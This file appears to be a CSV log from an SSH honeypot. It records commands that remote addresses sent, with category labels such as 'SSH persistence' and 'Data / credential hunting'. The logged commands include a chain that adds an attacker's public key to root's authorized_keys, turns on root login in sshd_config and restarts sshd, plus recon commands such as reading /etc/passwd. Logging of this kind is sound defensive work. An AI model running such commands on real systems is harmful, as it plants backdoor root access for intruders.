session_id,ip,username,mode,ssh_original_command,categories,malware_upload,malware_upload_reasons,termination_reason,created_files
1776546155_192.42.116.101_47911_sshshadow,192.42.116.101,admin,non_interactive_exec,LC_ALL=C sudo -S sh -c 'mkdir -p ~root/.ssh',SSH persistence,False,,exit_code_127,
1776546157_192.42.116.101_47911_sshshadow,192.42.116.101,admin,non_interactive_exec,LC_ALL=C sudo -S sh -c 'chmod 700 ~root/.ssh',SSH persistence,False,,exit_code_127,
1776546159_192.42.116.101_47911_sshshadow,192.42.116.101,admin,non_interactive_exec,LC_ALL=C sudo -S sh -c 'echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuhPmv3xdhU7JbMoc/ecBTDxiGqFNKbe564p4aNT6JbYWjNwZ5z6E4iQQDQ0bEp7uBtB0aut0apqDF/SL7pN5ybh2X44aCwDaSEB6bJuJi0yMkZwIvenmtCA1LMAr2XifvGS/Ulac7Qh5vFzfw562cWC+IOI+LyQZAcPgr+CXphJhm8QQ+O454ItXurQX6oPlA2rNfF36fnxYss1ZvUYC80wWTi9k2+/XR3IoQXZHKCFsJiwyKO2CY+jShBbDBbtdOX3/ksHNVNStA/jPE0HYD7u6V2Efjv9K+AEbklMsytD9T60Iu3ua+ugBrP5hL7zAjPHpXH8qW4Ku7dySZ4yvH >>~root/.ssh/authorized_keys',SSH persistence,False,,exit_code_127,
1776546161_192.42.116.101_47911_sshshadow,192.42.116.101,admin,non_interactive_exec,LC_ALL=C sudo -S sh -c 'sed -i '\''s/PermitRootLogin no/PermitRootLogin yes/'\'' /etc/ssh/sshd_config',SSH persistence,False,,exit_code_127,
1776546163_192.42.116.101_47911_sshshadow,192.42.116.101,admin,non_interactive_exec,LC_ALL=C sudo -S sh -c 'systemctl restart sshd.service',SSH persistence,False,,exit_code_127,
1776546165_192.42.116.101_47911_sshshadow,192.42.116.101,admin,non_interactive_exec,LC_ALL=C sudo -S sh -c 'pkill -HUP sshd',SSH persistence,False,,exit_code_127,
1776546178_192.42.116.142_34564_sshshadow,192.42.116.142,admin,non_interactive_exec,LC_ALL=C top -bn1,Generic recon,False,,normal_exit,
1776546335_34.91.248.132_43538_sshshadow,34.91.248.132,admin,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776546337_34.91.248.132_43538_sshshadow,34.91.248.132,admin,non_interactive_exec,cat /etc/passwd,Data / credential hunting; GCS-aware discovery,False,,normal_exit,
1776546339_34.91.248.132_43538_sshshadow,34.91.248.132,admin,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,normal_exit,
1776546341_34.91.248.132_43538_sshshadow,34.91.248.132,admin,non_interactive_exec,passwd,Data / credential hunting,False,,normal_exit,
